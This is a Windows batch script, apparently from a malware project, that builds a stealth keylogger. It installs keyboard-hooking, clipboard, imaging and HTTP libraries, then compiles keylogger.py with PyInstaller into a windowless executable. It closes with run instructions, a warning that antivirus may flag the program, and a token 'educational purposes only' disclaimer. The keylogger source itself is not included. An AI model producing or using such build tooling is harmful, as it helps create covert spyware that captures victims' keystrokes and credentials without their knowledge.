@echo off
echo Advanced Keylogger Builder
echo -------------------------
echo.

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH.
    echo Please install Python from https://www.python.org/downloads/
    echo Make sure to check "Add Python to PATH" during installation.
    echo.
    pause
    exit /b 1
)

echo [1/3] Creating virtual environment...
python -m venv venv
call venv\Scripts\activate

echo [2/3] Installing dependencies...
echo Installing pip wheel...
pip install --upgrade pip wheel setuptools

echo Installing packages from requirements...
pip install --prefer-binary pynput==1.7.6 requests==2.28.1 pyperclip==1.8.2
echo Installing Pillow (latest version)...
pip install --prefer-binary Pillow
echo Installing PyInstaller...
pip install --prefer-binary pyinstaller

if %errorlevel% neq 0 (
    echo [WARNING] Some dependencies failed to install.
    echo Trying alternative installation method...
    
    echo Installing Microsoft Visual C++ Redistributable...
    powershell -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile 'vc_redist.x64.exe'"
    vc_redist.x64.exe /quiet /norestart
    del vc_redist.x64.exe
    
    echo Installing pre-built binaries...
    pip install --only-binary :all: pynput requests pyperclip Pillow pyinstaller
)

echo [3/3] Building executable...
echo Building keylogger.exe (this may take a few minutes)...
pyinstaller --onefile --noconsole --hidden-import=PIL._tkinter --clean --name keylogger keylogger.py

if %errorlevel% neq 0 (
    echo [ERROR] Building executable failed.
    echo Trying with simplified build options...
    pyinstaller --onefile --name keylogger keylogger.py
)

echo.
if exist dist\keylogger.exe (
    echo Build complete!
    echo The executable is located in the "dist" folder.
) else (
    echo [ERROR] Building executable failed. Please check the error messages above.
)
echo.

REM Optional: Clean up build files
choice /C YN /M "Clean up build files (pyinstaller artifacts)?"
if %errorlevel% equ 1 (
    echo Cleaning up...
    rmdir /s /q build
    del /q keylogger.spec
    echo Cleanup complete.
)

REM Keep the virtual environment
echo.
echo To run the keylogger:
echo   1. Navigate to the dist folder
echo   2. Run keylogger.exe
echo.
echo Note: The keylogger might be flagged by antivirus software.
echo This tool is for educational purposes only.
echo.

pause 